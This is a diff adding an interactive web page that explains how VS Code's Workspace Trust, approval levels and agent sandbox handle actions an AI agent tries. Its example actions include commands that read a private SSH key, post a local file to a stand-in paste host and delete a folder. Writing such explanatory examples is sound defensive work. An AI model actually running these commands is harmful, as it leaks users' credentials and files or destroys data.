@@ -1,0 +1,509 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>VS Code agent guardrails</title>
+<meta name="description" content="Which VS Code safeguards stop an AI agent? Pick an action and settings and see what Workspace Trust, approval and the sandbox do.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@75..125,600..800&family=IBM+Plex+Mono:wght@400;500;600&family=Public+Sans:ital,wght@0,400;0,600;1,400&display=swap">
+<style>
+/* Printed worksheet look shared with the other guides: paper, ink, hairline rules, one red for "stopped". */
+:root{
+  color-scheme:light;
+  --bg:#F3F0E8; --ink:#17150F; --muted:#5F5A4F; --line:#D2CCBE; --rule:#17150F;
+  --red:#B5321C; --hatch:rgba(23,21,15,.10); --hover:rgba(23,21,15,.045);
+  --display:"Archivo","Arial Narrow",Arial,sans-serif;
+  --body:"Public Sans",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    color-scheme:dark;
+    --bg:#15140F; --ink:#ECE7DB; --muted:#A49E90; --line:#37342C; --rule:#ECE7DB;
+    --red:#F07A60; --hatch:rgba(236,231,219,.10); --hover:rgba(236,231,219,.06);
+  }
+}
+*{box-sizing:border-box}
+@media (prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}
+body{margin:0;background:var(--bg);color:var(--ink);font:1rem/1.55 var(--body);-webkit-font-smoothing:antialiased}
+.page{max-width:1120px;margin:0 auto;padding:0 max(16px,env(safe-area-inset-right,0px)) 64px max(16px,env(safe-area-inset-left,0px))}
+a{color:inherit;text-decoration-color:var(--red);text-decoration-thickness:1.5px;text-underline-offset:3px}
+a:hover{color:var(--red)}
+a:focus-visible,button:focus-visible{outline:2px solid var(--red);outline-offset:3px}
+h1,h2,h3{font-family:var(--display);text-wrap:balance;margin:0}
+h1{font-size:clamp(2.2rem,6.4vw,4.4rem);font-weight:800;font-stretch:88%;line-height:.98;letter-spacing:-0.02em}
+h2{font-size:clamp(1.35rem,2.4vw,1.7rem);font-weight:750;line-height:1.1;letter-spacing:-0.012em}
+h3{font-size:1rem;font-weight:700;line-height:1.25}
+p{margin:0}
+code,.mono{font-family:var(--mono);font-size:.9em;overflow-wrap:anywhere}
+.lbl{font:600 .72rem/1.3 var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.tag{font:500 .72rem/1 var(--mono);color:var(--muted);white-space:nowrap}
+
+.top{display:flex;justify-content:space-between;gap:16px;padding:18px 0;border-bottom:1px solid var(--line);font-size:.85rem;color:var(--muted)}
+.hero{padding:clamp(36px,7vw,84px) 0 clamp(28px,4vw,48px);border-bottom:3px solid var(--rule)}
+.hero .lede{max-width:44ch;margin-top:20px;font-size:clamp(1.05rem,1.7vw,1.25rem)}
+section{padding:clamp(32px,5vw,56px) 0;border-bottom:1px solid var(--line)}
+.ph{margin-bottom:22px}
+.ph .lbl{margin-bottom:6px}
+
+/* two questions */
+.two{display:grid;grid-template-columns:1fr 1fr;border-top:1px solid var(--rule)}
+.two > div{padding:18px 20px 4px 0}
+.two > div + div{border-left:1px solid var(--line);padding-left:20px}
+.two .q{font:700 clamp(1.15rem,2.2vw,1.5rem)/1.2 var(--display);margin:8px 0 10px}
+.src{font-size:.82rem;color:var(--muted)}
+@media (max-width:640px){.two{grid-template-columns:1fr}.two > div + div{border-left:0;border-top:1px solid var(--line);padding-left:0}}
+
+/* simulator */
+.sim{display:grid;grid-template-columns:minmax(0,5fr) minmax(0,7fr);gap:clamp(24px,4vw,56px);align-items:start}
+@media (max-width:860px){.sim{grid-template-columns:1fr}}
+fieldset{border:0;margin:0;padding:0;min-width:0}
+fieldset[disabled]{opacity:.38}
+legend{padding:0;margin-bottom:6px}
+.set{display:block;width:fit-content;margin:-2px 0 6px;font:.74rem/1.3 var(--mono);color:var(--muted);overflow-wrap:anywhere}
+.grp{padding:14px 0;border-top:1px solid var(--line)}
+.grp:first-child{border-top:1px solid var(--rule)}
+.acts label{display:flex;gap:10px;align-items:baseline;padding:7px 8px;margin:0 -8px;cursor:pointer}
+.acts label:hover{background:var(--hover)}
+.acts input,.opts input{position:absolute;opacity:0;pointer-events:none}
+.acts .what{font-size:.9rem;color:var(--muted);display:block}
+.acts .cmd{font:500 .9rem/1.35 var(--mono);overflow-wrap:anywhere}
+.acts .dot{flex:none;width:11px;height:11px;border:1.5px solid var(--ink);transform:translateY(1px)}
+.acts input:checked + .dot{background:var(--ink)}
+.acts input:focus-visible + .dot,.opts input:focus-visible + span{outline:2px solid var(--red);outline-offset:3px}
+.opts{display:flex;flex-wrap:wrap;gap:4px 18px}
+.opts label{cursor:pointer}
+.opts span{display:inline-block;padding:3px 0;border-bottom:3px solid transparent;color:var(--muted)}
+.opts label:hover span{color:var(--ink)}
+.opts input:checked + span{color:var(--ink);font-weight:600;border-bottom-color:var(--ink)}
+.presets{display:flex;flex-wrap:wrap;gap:6px 18px;padding-top:14px;border-top:1px solid var(--rule)}
+.presets button{font:inherit;color:inherit;background:none;border:0;padding:0;cursor:pointer;text-decoration:underline;text-decoration-color:var(--red);text-decoration-thickness:1.5px;text-underline-offset:3px}
+.presets button:hover{color:var(--red)}
+
+.course{position:relative}
+.verdict{border-top:3px solid var(--rule);border-bottom:1px solid var(--rule);padding:16px 0 18px;margin-bottom:6px;min-height:7.2rem}
+.verdict .big{font:800 clamp(1.5rem,3.4vw,2.3rem)/1.05 var(--display);font-stretch:88%;letter-spacing:-0.015em}
+.verdict.stop .big{color:var(--red)}
+.verdict .after{margin-top:8px;color:var(--muted)}
+ol.gates{list-style:none;margin:0;padding:0;position:relative}
+ol.gates::before{content:"";position:absolute;left:35px;top:0;bottom:0;border-left:1.5px dashed var(--line)}
+.gate{display:grid;grid-template-columns:72px minmax(0,1fr);padding:18px 0;border-bottom:1px solid var(--line);transition:opacity .25s}
+.gate:last-child{border-bottom:0}
+.gate .body{grid-column:2}
+.gate.wait{opacity:.32}
+.gate .state{font:600 .72rem/1.3 var(--mono);letter-spacing:.08em;text-transform:uppercase;margin:3px 0 6px}
+.gate.stop .state{color:var(--red)}
+.gate.ask .state::before{content:"? "}
+.gate.stop .state::before{content:"× "}
+.gate.pass .state::before{content:"→ "}
+.gate .say{max-width:56ch}
+.gate blockquote{margin:10px 0 0;padding:0 0 0 12px;border-left:2px solid var(--line);font-size:.86rem;color:var(--muted);max-width:60ch}
+.gate.stop blockquote{border-left-color:var(--red)}
+.gate blockquote + blockquote{margin-top:8px}
+.gate blockquote a{white-space:nowrap}
+.bot{position:absolute;left:0;top:0;width:72px;text-align:center;font:600 .82rem/1 var(--mono);background:var(--bg);padding:5px 0;z-index:1;transform:translateY(20px);white-space:nowrap}
+@media (prefers-reduced-motion:no-preference){.bot{transition:transform .38s cubic-bezier(.3,.7,.2,1)}}
+.bot.stop{color:var(--red)}
+.scope{margin-top:14px;font-size:.82rem;color:var(--muted)}
+
+/* lists */
+.rows{border-top:1px solid var(--rule)}
+.row{display:grid;grid-template-columns:minmax(0,4fr) minmax(0,7fr);gap:8px 32px;padding:16px 0;border-bottom:1px solid var(--line)}
+.row blockquote{margin:0;font-size:.9rem;color:var(--muted)}
+.row blockquote a{white-space:nowrap}
+@media (max-width:700px){.row{grid-template-columns:1fr}}
+.tbl{overflow-x:auto}
+table{border-collapse:collapse;width:100%;font-size:.93rem}
+th,td{text-align:left;vertical-align:top;padding:9px 16px 9px 0;border-bottom:1px solid var(--line)}
+th{font:600 .72rem/1.3 var(--mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted);border-bottom-color:var(--rule)}
+ol.base{margin:0;padding:0;list-style:none;counter-reset:b;border-top:1px solid var(--rule)}
+ol.base li{counter-increment:b;display:grid;grid-template-columns:48px minmax(0,1fr);padding:13px 0;border-bottom:1px solid var(--line)}
+ol.base li::before{content:counter(b,decimal-leading-zero);font:500 .85rem/1.7 var(--mono);color:var(--muted)}
+ul.srcs{margin:0;padding:0;list-style:none;columns:2;column-gap:40px;font-size:.93rem}
+ul.srcs li{padding:4px 0;break-inside:avoid}
+@media (max-width:700px){ul.srcs{columns:1}}
+
+footer{padding-top:28px;font-size:.88rem;color:var(--muted)}
+.ai-note{display:grid;grid-template-columns:auto minmax(0,1fr);gap:4px 14px;margin-bottom:22px}
+.ai-note b{color:var(--ink)}
+.tag-key{padding:0;border:0}
+.tag-key h2{font:600 .72rem/1.3 var(--mono);letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px}
+.tag-key dl{display:grid;grid-template-columns:auto minmax(0,1fr);gap:4px 14px;margin:0}
+.tag-key dd{margin:0}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip-path:inset(50%)}
+/* section links */
+h2 a.sec-link,h3 a.sec-link{color:inherit;text-decoration:none;font:inherit;letter-spacing:inherit;text-transform:inherit}
+h2 a.sec-link::after,h3 a.sec-link::after{content:"#";margin-left:.45em;font-weight:400;opacity:0;transition:opacity .12s}
+h2:hover a.sec-link::after,h3:hover a.sec-link::after,a.sec-link:focus-visible::after{opacity:.5}
+a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;border-radius:2px}
+@media (hover:none){h2 a.sec-link::after,h3 a.sec-link::after{opacity:.35}}
+@media print{h2 a.sec-link::after,h3 a.sec-link::after{display:none}}
+:is(section,article,h2,h3)[id]{scroll-margin-top:24px}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-15">15 Nov 2026</time></span></div>
+
+  <header class="hero">
+    <h1>Which VS Code safeguards stop an AI agent?</h1>
+    <p class="lede">VS Code has two safeguards for AI agents. Approval asks you before an action runs. The sandbox limits which files and network a command can reach. Pick an action and settings below to see which safeguard stops it.</p>
+  </header>
+
+  <section id="two-questions">
+    <div class="ph"><h2 id="h-two-questions"><a class="sec-link" href="#two-questions">The two safeguards: approval and sandbox</a></h2></div>
+    <div class="two">
+      <div>
+        <p class="lbl">Approval</p>
+        <p class="q">&ldquo;Can this action run without asking for confirmation?&rdquo;</p>
+        <p>Approval is checked before an action starts. After a yes it does nothing more.</p>
+      </div>
+      <div>
+        <p class="lbl">Sandbox <span class="tag">[preview]</span></p>
+        <p class="q">&ldquo;Which resources can this covered process access when it runs?&rdquo;</p>
+        <p>The sandbox limits a command while it runs, also after you said yes.</p>
+      </div>
+    </div>
+    <p class="src" style="margin-top:14px">Both quotes: <a href="https://code.visualstudio.com/docs/agents/concepts/trust-and-safety#agent-sandboxing">Trust and safety for AI agents</a>.</p>
+  </section>
+
+  <section id="course">
+    <div class="ph"><h2 id="h-course"><a class="sec-link" href="#course">Try it: pick an action and settings, see what happens</a></h2><p style="margin-top:8px">Every action passes four checks in order.</p></div>
+    <div class="sim">
+      <form id="ctl" autocomplete="off">
+        <fieldset class="grp acts" id="f-act"><legend class="lbl">Action the agent tries</legend></fieldset>
+        <fieldset class="grp"><legend class="lbl">Workspace</legend><div class="opts" data-k="trust"></div></fieldset>
+        <fieldset class="grp"><legend class="lbl">Permission level</legend><div class="opts" data-k="level"></div></fieldset>
+        <fieldset class="grp" id="f-judge"><legend class="lbl">The AI reviewer&rsquo;s answer (Assisted only)</legend><div class="opts" data-k="judge"></div></fieldset>
+        <fieldset class="grp" id="f-env"><legend class="lbl">Rule for <span class="mono" style="text-transform:none;letter-spacing:0">.env</span> edits</legend><div class="opts" data-k="env"></div></fieldset>
+        <fieldset class="grp"><legend class="lbl">Sandbox</legend><div class="opts" data-k="sandbox"></div></fieldset>
+        <fieldset class="grp" id="f-net"><legend class="lbl">Sandbox network</legend><div class="opts" data-k="net"></div></fieldset>
+        <fieldset class="grp" id="f-esc"><legend class="lbl">Run outside the sandbox</legend><div class="opts" data-k="esc"></div></fieldset>
+        <fieldset class="grp" id="f-answer"><legend class="lbl">Your answer when VS Code asks</legend><div class="opts" data-k="answer"></div></fieldset>
+        <div class="presets" id="presets"></div>
+      </form>
+
+      <div class="course">
+        <div class="verdict" id="verdict" aria-live="polite"><p class="big" id="v-big"></p><p class="after" id="v-after"></p></div>
+        <div style="position:relative">
+          <span class="bot" id="bot" aria-hidden="true">[•_•]</span>
+          <ol class="gates" id="gates">
+            <li class="gate" data-g="trust"><div class="body"><h3 id="gate-trust"><a class="sec-link" href="#gate-trust">1. Is the workspace trusted?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="approval"><div class="body"><h3 id="gate-approval"><a class="sec-link" href="#gate-approval">2. Does VS Code ask you first?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="sandbox"><div class="body"><h3 id="gate-sandbox"><a class="sec-link" href="#gate-sandbox">3. Does the sandbox block it?</a> <span class="tag">[preview]</span></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="review"><div class="body"><h3 id="gate-review"><a class="sec-link" href="#gate-review">4. Can you undo it?</a></h3><div class="out"></div></div></li>
+          </ol>
+        </div>
+        <p class="scope">Applies to Copilot harness sessions with the default tools. Other harnesses behave differently.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="not-a-fence">
+    <div class="ph"><h2 id="h-not-a-fence"><a class="sec-link" href="#not-a-fence">What these safeguards do not protect against</a></h2></div>
+    <div class="rows" id="holes"></div>
+  </section>
+
+  <section id="platforms">
+    <div class="ph"><h2 id="h-platforms"><a class="sec-link" href="#platforms">Which systems support the sandbox</a> <span class="tag">[preview]</span></h2></div>
+    <div class="tbl"><table>
+      <thead><tr><th>System</th><th>Status</th><th>Needs</th></tr></thead>
+      <tbody>
+        <tr><td>macOS</td><td>Preview</td><td>macOS 15 or later</td></tr>
+        <tr><td>Linux and WSL2</td><td>Preview</td><td>glibc, <code>bubblewrap</code> 0.5.0 or later, <code>slirp4netns</code></td></tr>
+        <tr><td>Windows</td><td>Experimental</td><td>Windows 11, 25H2 build 26200.9550 or later</td></tr>
+        <tr><td>Alpine (musl) and WSL1</td><td>Not supported</td><td></td></tr>
+      </tbody>
+    </table></div>
+    <div class="rows" id="plat" style="margin-top:22px;border-top:0"></div>
+  </section>
+
+  <section id="baseline">
+    <div class="ph"><p class="lbl">From the VS Code docs</p><h2 id="h-baseline"><a class="sec-link" href="#baseline">Six settings the VS Code docs recommend</a></h2></div>
+    <ol class="base">
+      <li><span>Open untrusted projects in restricted mode.</span></li>
+      <li><span>Use agent sandboxing and configure network access. <span class="tag">[preview]</span></span></li>
+      <li><span>Review all file edits before integrating them.</span></li>
+      <li><span>Protect sensitive files.</span></li>
+      <li><span>Keep auto-approval scoped to the session.</span></li>
+      <li><span>Review MCP servers before trusting them.</span></li>
+    </ol>
+    <p class="src" style="margin-top:14px">Step names quoted from <a href="https://code.visualstudio.com/docs/agents/run/security#recommended-security-baseline">Recommended security baseline</a>.</p>
+  </section>
+
+  <section id="sources">
+    <div class="ph"><h2 id="h-sources"><a class="sec-link" href="#sources">Sources</a></h2></div>
+    <ul class="srcs">
+      <li><a href="https://code.visualstudio.com/docs/agents/concepts/trust-and-safety">Trust and safety for AI agents</a></li>
+      <li><a href="https://code.visualstudio.com/docs/agents/run/approvals">Approvals and permission levels</a></li>
+      <li><a href="https://code.visualstudio.com/docs/agents/run/agent-sandboxing">Agent sandboxing</a></li>
+      <li><a href="https://code.visualstudio.com/docs/agents/run/security">AI security in VS Code</a></li>
+      <li><a href="https://code.visualstudio.com/docs/agents/run/review-code-edits">Review code edits</a></li>
+      <li><a href="https://code.visualstudio.com/docs/agents/run/manage-mcp-servers">Manage MCP servers</a></li>
+      <li><a href="https://code.visualstudio.com/docs/editing/workspaces/workspace-trust">Workspace Trust</a></li>
+      <li><a href="https://github.com/microsoft/vscode/tree/d03edc4b18d687c45af067195bad9544b5b07475">VS Code source code</a>, commit <code>d03edc4</code> of 15 Nov 2026</li>
+    </ul>
+    <p class="src" style="margin-top:14px">Docs pages dated 11 Nov 2026 by Microsoft and read on 15 Nov 2026.</p>
+  </section>
+
+  <footer>
+    <p class="ai-note"><b>Made with AI</b><span>This page was written with the help of AI. Its content has not necessarily been fully quality checked by a human.</span></p>
+    <section class="tag-key" id="tag-key"><h2 id="h-tag-key"><a class="sec-link" href="#tag-key">Tags on this page</a></h2>
+      <dl>
+        <dt><span class="tag">[inference]</span></dt><dd>Interpretation by AI that is not stated in a source.</dd>
+        <dt><span class="tag">[preview]</span></dt><dd>A feature in preview.</dd>
+      </dl>
+    </section>
+  </footer>
+</div>
+
+<script>
+(function(){
+"use strict";
+var D="https://code.visualstudio.com/docs/";
+var S={ts:"agents/concepts/trust-and-safety",ap:"agents/run/approvals",sb:"agents/run/agent-sandboxing",se:"agents/run/security",rv:"agents/run/review-code-edits",mcp:"agents/run/manage-mcp-servers",wt:"editing/workspaces/workspace-trust",pol:"enterprise/policies"};
+var N={ts:"Trust and safety",ap:"Approvals",sb:"Agent sandboxing",se:"AI security",rv:"Review code edits",mcp:"Manage MCP servers",wt:"Workspace Trust",pol:"Enterprise policies",src:"VS Code source code"};
+/* Every quote is checked word for word against the source. See vscode-guardrails.factcheck.md. */
+var Q={
+restricted:["wt","Opening a workspace in restricted mode disables agents in that workspace."],
+trustcert:["ts","Trust permits access or execution; it doesn't certify that every result or action is safe."],
+manual:["ap","Uses your tool, URL, and terminal approval settings. Actions that are not auto-approved require your confirmation."],
+assisted:["ap","Uses an LLM judge to assess each tool call. Calls that the judge does not approve require your confirmation."],
+assistedrisk:["se","This permission level reduces approval interruptions but is not a security boundary."],
+all:["ap","Runs all tool calls without confirmation."],
+termdefault:["ap","By default, common read-only commands run automatically, while risky commands such as rm and del require approval."],
+runtime:["ap","In Copilot harness sessions, the runtime can approve read-only commands or sandboxed commands before terminal approval rules are evaluated."],
+besteffort:["ap","Terminal auto-approval is a best-effort convenience, not a security boundary."],
+urlreq:["ap","Prevents data from being sent to an untrusted site."],
+urlres:["ap","Helps prevent prompt injection from untrusted content."],
+sensitive:["rv","Sensitive-file approval happens before the agent saves an edit, rather than during review."],
+editauto:["ts","File edits might be auto-approved."],
+builtin:["se","Built-in agent tools can only read and write files within the current workspace folder."],
+privs:["se","The agent can execute terminal commands and shell scripts with your user privileges"],
+cwd:["sb","The sandbox automatically grants read and write access to the current working directory."],
+ssh:["ts","It protects sensitive locations, such as SSH keys and shell configuration, and applies to child processes such as package managers and build scripts."],
+netopen:["sb","Turning on sandboxing does not block outbound network access by default."],
+netblock:["sb","Set it to false to block outbound access, including for the integrated browser."],
+escask:["sb","The agent requests approval when a sandboxed command fails or sandbox restrictions would block it."],
+escno:["sb","Rejecting the confirmation prevents the command from running outside the sandbox."],
+escoff:["sb","Allow Outside Sandbox is not offered, and requests to run outside the sandbox fail instead of prompting for approval."],
+escyes:["sb","Approval to run outside the sandbox removes file system and network restrictions for that operation."],
+notcovered:["ts","The agent's read, edit, and write tools use VS Code's permission system directly."],
+fetchsep:["ts","Network controls for fetch and browser tools are separate from sandbox network controls for terminal commands."],
+indep:["sb","For example, the sandbox continues to restrict processes when you select Allow all."],
+keep:["rv","Pending edits are already saved to disk, so running your application or tests uses the changed files."],
+noundo:["ts","Stopping a request or restoring workspace files doesn't reverse completed terminal commands, network requests, deployments, or changes to external services."],
+notvm:["sb","Sandboxing is not a virtual machine or user-account boundary, and it does not replace endpoint security."],
+devtool:["sb","It grants read access to tool directories on PATH, toolchain directories, developer-tool configuration and caches, including registry tokens, and read and write access to shared build caches."],
+nosilent:["sb","If an operating system dependency is unavailable, the command does not silently run without the sandbox."],
+worktree:["ts","It doesn't restrict commands, network access, or access to other files."],
+ext:["wt","Workspace Trust can't prevent a malicious extension from executing code and ignoring Restricted Mode."],
+mcp:["mcp","In a trusted workspace, they can start without a separate MCP trust prompt, including after configuration changes."],
+status:["ap","Agent sandboxing is in Preview on macOS, Linux, and WSL2, and Experimental on Windows."],
+fatigue:["ts","Repeatedly approving commands can cause you to pay less attention to what you're approving, especially during long agent sessions."],
+rulecat:["src","cat: true","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/terminal/common/autoApprove/defaultAutoApproveRules.ts#L32-L39"],
+rulecurl:["src","curl: false","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/terminal/common/autoApprove/defaultAutoApproveRules.ts#L229-L230"],
+allsens:["se","Bypasses all user approvals, potentially leading to destructive actions, updating sensitive workspace files, or executing arbitrary code."],
+sandboxauto:["src","Auto-approve shell commands that run sandboxed by default","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/copilotAgentSession.ts#L8886-L8894"],
+mcpask:["se","MCP tool invocations require explicit user approval, which you can grant at different scopes: session-level for temporary access, workspace-level for project-specific trust, or user-level for broader permissions."],
+mcpbroad:["se","They can access all files on the local machine, execute arbitrary code, and interact with system resources and external services."],
+mcpsb:["sb","Run locally launched MCP servers in the sandbox when sandboxing is enabled."],
+mcpown:["sb","They don't cover servers you start independently.",D+"agents/run/agent-sandboxing#:~:text=cover%20servers%20you%20start%20independently"],
+bypass:["src","Sandbox bypass requires confirmation","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/sessionPermissions.ts#L253-L256"]
+};
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;")}
+function qlink(id){
+  var q=Q[id],w=q[1].split(" ").slice(0,7),i;
+  if(q[2])return q[2];
+  for(i=0;i<w.length;i++)if(/['`]/.test(w[i])){w=w.slice(0,i);break}
+  var start=w.join(" ").replace(/[.,;:]$/,"");
+  return D+S[q[0]]+"#:~:text="+encodeURIComponent(start).replace(/-/g,"%2D");
+}
+function quote(id){return '<blockquote>&ldquo;'+esc(Q[id][1])+'&rdquo; <a href="'+qlink(id)+'">'+N[Q[id][0]]+'</a></blockquote>'}
+function tag(t){return ' <span class="tag">['+t+']</span>'}
+
+var ACTS=[
+ {id:"status",kind:"term",cmd:"git status",what:"Look at the repo",done:"Nothing changed."},
+ {id:"rm",kind:"term",cmd:"rm -rf dist",what:"Delete a folder in the project",done:"dist is gone."},
+ {id:"ssh",kind:"term",cmd:"cat ~/.ssh/id_ed25519",what:"Read your SSH key",done:"The agent has read your private key."},
+ {id:"curl",kind:"term",cmd:"curl -d @notes.txt https://paste.example",what:"Send a file to another server",done:"notes.txt is on someone else's server."},
+ {id:"env",kind:"edit",cmd:"edit .env",what:"Change a file with secrets, using the edit tool",done:".env is changed on disk."},
+ {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"The page text is in the chat. It may hold instructions."},
+ {id:"mcp",kind:"mcp",cmd:"mcp: create_issue",what:"Call a tool on a local MCP server",done:"The server did what the tool does."}
+];
+/* The VS Code setting behind a control, and the docs page that names it. */
+var SETS={level:["chat.permissions.default","ap"],env:["chat.tools.edits.autoApprove","rv"],sandbox:["chat.agent.sandbox.enabled","sb"],net:["chat.agent.sandbox.network.allowNetwork","sb"],esc:["chat.agent.sandbox.allowUnsandboxedCommands","sb"]};
+var OPTS={
+ trust:[["trusted","Trusted"],["restricted","Restricted Mode"]],
+ level:[["manual","Manual"],["assisted","Assisted"],["all","Allow all"]],
+ judge:[["yes","Yes"],["no","No"]],
+ env:[["off","None"],["on","Ask first"]],
+ sandbox:[["off","Off"],["on","On"]],
+ net:[["open","Open"],["blocked","Blocked"]],
+ esc:[["ask","May ask"],["never","Never"]],
+ answer:[["yes","Yes"],["no","No"]]
+};
+var PRESETS=[
+ ["VS Code defaults",{trust:"trusted",level:"manual",env:"off",sandbox:"off",net:"open",esc:"ask"}],
+ ["Allow all, no sandbox",{trust:"trusted",level:"all",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"}],
+ ["Strictest settings",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
+];
+var st={act:"curl",trust:"trusted",level:"manual",judge:"yes",env:"off",sandbox:"off",net:"open",esc:"ask",answer:"yes"};
+
+/* The rules. Each gate returns a state, a sentence and the quotes behind it. */
+function evaluate(s){
+  var a=ACTS.filter(function(x){return x.id===s.act})[0],term=a.kind==="term",g=[],asks=0,ran=true,why="",fenced=false;
+  function push(gate,state,say,qs){g.push({g:gate,state:state,say:say,qs:qs||[]})}
+  function asked(gate,say,qs,noSay,noQs){
+    asks++;
+    if(s.answer==="no"){push(gate,"stop",noSay||(say+" You say no."),noQs||qs);ran=false;why="no";return false}
+    push(gate,"ask",say+" You say yes.",qs);return true;
+  }
+  // 1 trust
+  if(s.trust==="restricted"){push("trust","stop","The workspace is in Restricted Mode, so agents are turned off.",["restricted"]);return{g:g,ran:false,why:"trust",asks:0,a:a}}
+  push("trust","pass","The workspace is trusted, so the agent is allowed to work in it.",["trustcert"]);
+  // 2 approval
+  var ok=true;
+  if(s.level==="all"){
+    if(a.id==="env") push("approval","pass","Allow all skips every approval, also for files with secrets.",["all","allsens"]);
+    else push("approval","pass","Allow all skips every approval. VS Code does not ask you.",["all"]);
+  }
+  else if(s.level==="assisted"){
+    if(s.judge==="no") ok=asked("approval","An AI reviewer checked the action and did not approve it, so VS Code asks you.",["assisted"]);
+    else if(a.id==="env"&&s.env==="on") push("approval","judge","An AI reviewer checked the action and approved it, so your .env rule is skipped."+tag("inference"),["assisted","assistedrisk"]);
+    else push("approval","judge","An AI reviewer checked the action and approved it. VS Code does not ask you.",["assisted","assistedrisk"]);
+  }
+  else if(term&&s.sandbox==="on") push("approval","pass","VS Code does not ask, because the command runs inside the sandbox.",["runtime","sandboxauto"]);
+  else if(a.id==="status") push("approval","pass","git status only reads, so it runs without asking you.",["termdefault"]);
+  else if(a.id==="rm") ok=asked("approval","rm deletes files, so VS Code asks you first.",["termdefault"]);
+  else if(a.id==="ssh") push("approval","pass","cat is on the built-in list of read-only commands, so it runs without asking you.",["rulecat","termdefault"]);
+  else if(term) ok=asked("approval","curl is on the built-in list of commands that need approval, so VS Code asks you.",["rulecurl","manual"]);
+  else if(a.id==="env"){
+    if(s.env==="on") ok=asked("approval","Your rule for .env makes VS Code show the change and ask you before it is saved.",["sensitive"]);
+    else push("approval","pass","No rule covers .env, so the edit is saved without asking you."+tag("inference"),["editauto"]);
+  }
+  else if(a.id==="mcp") ok=asked("approval","A tool on an MCP server needs your approval. You can approve it once or for a longer period.",["mcpask"]);
+  else ok=asked("approval","VS Code asks twice: may the agent contact the site, and may the response go into the chat?",["urlreq","urlres"]);
+  if(!ok) return{g:g,ran:false,why:why,asks:asks,a:a};
+  // 3 sandbox
+  if(a.id==="mcp"){
+    if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The MCP server runs with your user rights.",["mcpbroad"]);
+    else{fenced=true;push("sandbox","pass","VS Code started the server inside the sandbox. A server you start yourself is outside it.",["mcpsb","mcpown"])}
+  } else if(!term){
+    if(a.id==="env") push("sandbox","skip","The sandbox only covers commands. The edit tool is not a command, so the sandbox does not apply.",["notcovered","builtin"]);
+    else push("sandbox","skip","The fetch tool has its own network rules. The sandbox does not apply.",["fetchsep"]);
+  } else if(s.sandbox==="off") push("sandbox","open","The sandbox is off, which is the default. The command runs with your user rights.",["privs"]);
+  else {
+    var blocked=(a.id==="ssh")||(a.id==="curl"&&s.net==="blocked");
+    if(!blocked){
+      fenced=true;
+      if(a.id==="curl") push("sandbox","pass","The sandbox allows network access by default, so the file is sent.",["netopen"]);
+      else push("sandbox","pass","The command only touches the project folder, which the sandbox allows"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?["cwd","indep"]:["cwd"]);
+    } else {
+      var bq=a.id==="ssh"?"ssh":"netblock",bs=a.id==="ssh"?"The sandbox blocks it. The SSH key is outside the folders the sandbox allows.":"The sandbox blocks it. Network access is turned off.";
+      if(s.esc==="never"){push("sandbox","stop",bs+" Asking to run outside the sandbox is turned off.",[bq,"escoff"]);return{g:g,ran:false,why:"fence",asks:asks,a:a}}
+      ok=asked("sandbox",bs+" The agent asks to run it outside the sandbox"+(s.level==="all"?", also with Allow all.":"."),s.level==="all"?[bq,"escask","bypass","escyes"]:[bq,"escask","escyes"],bs+" The agent asks to run it outside the sandbox. You say no.",[bq,"escask","escno"]);
+      if(!ok) return{g:g,ran:false,why:"fence-no",asks:asks,a:a};
+    }
+  }
+  // 4 afterwards
+  if(a.id==="env") push("review","after","You can choose Keep or Undo, but the file is already saved on disk.",["keep"]);
+  else if(a.id==="status") push("review","after","Nothing changed, so there is nothing to undo.",[]);
+  else push("review","after","This cannot be undone.",["noundo"]);
+  return{g:g,ran:true,asks:asks,a:a,fenced:fenced};
+}
+var LABEL={pass:"Allowed",ask:"VS Code asks you",stop:"Stopped",skip:"Does not apply",judge:"AI reviewer decides",open:"Sandbox is off",after:"After it ran"};
+function verdict(r){
+  if(!r.ran){
+    if(r.why==="trust") return["Result: the agent is turned off.","Nothing ran."];
+    if(r.why==="fence") return["Result: blocked by the sandbox.","Nothing ran, and VS Code did not need to ask you."];
+    if(r.why==="fence-no") return["Result: blocked by the sandbox. You said no to running it outside.","Nothing ran."];
+    return["Result: stopped. You said no.","Nothing ran."];
+  }
+  var judged=r.g.some(function(x){return x.state==="judge"});
+  var how=r.asks===0?(judged?"Result: the action ran. An AI reviewer approved it, not you.":"Result: the action ran. VS Code did not ask you."):r.asks===1?"Result: the action ran. You approved it.":"Result: the action ran. You approved it twice.";
+  return[how,r.a.done];
+}
+
